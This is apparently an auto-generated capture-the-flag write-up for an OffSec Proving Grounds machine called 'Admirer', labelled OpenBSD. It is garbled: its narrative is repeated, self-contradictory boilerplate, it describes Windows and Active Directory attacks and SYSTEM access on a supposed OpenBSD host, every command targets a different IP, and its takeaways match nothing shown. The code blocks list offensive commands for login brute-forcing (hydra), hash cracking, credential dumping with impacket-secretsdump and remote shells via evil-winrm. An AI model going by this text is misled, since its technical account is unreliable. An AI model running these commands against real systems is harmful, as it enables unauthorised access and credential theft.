---
TitleSEO: "OffSec Proving Grounds — Admirer (Easy OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Admirer (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Admirer. Resource-Based Constrained Delegation and Docker Escape to achieve easy compromise on OpenBSD."
Keywords: "hackthebox, tryhackme, reversing, forensics, easy"
URL: "https://zurefx.github.io/writeups/htb-admirer-542.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-admirer-542/"
Date: "2025-08-15"
Tags: "HackTheBox, TryHackMe, Reversing, Forensics, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-admirer-542"
Permalink: "/writeups/htb-admirer-542.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Admirer** is rated **Easy** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.15.118.85`.

### Objectives

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.77.27.220 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.16.141.216 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.24.87.56/FUZZ
```

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

```bash
crackmapexec smb 10.100.121.245 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.203.49 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

Key finding: **Resource-Based Constrained Delegation**.

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible.

### Initial Access

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.189.15/FUZZ
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.

```powershell
evil-winrm -i 10.41.117.100 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.68.147.148
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.41.231 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.112.56 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `smbexec`
- `pwncat`
- `ligolo-ng`
- `metasploit`
- `chisel`
- `netcat`
- `secretsdump`

### Key Takeaways

- Resource-Based Constrained Delegation
- Docker Escape
- XXE
- SeDebugPrivilege
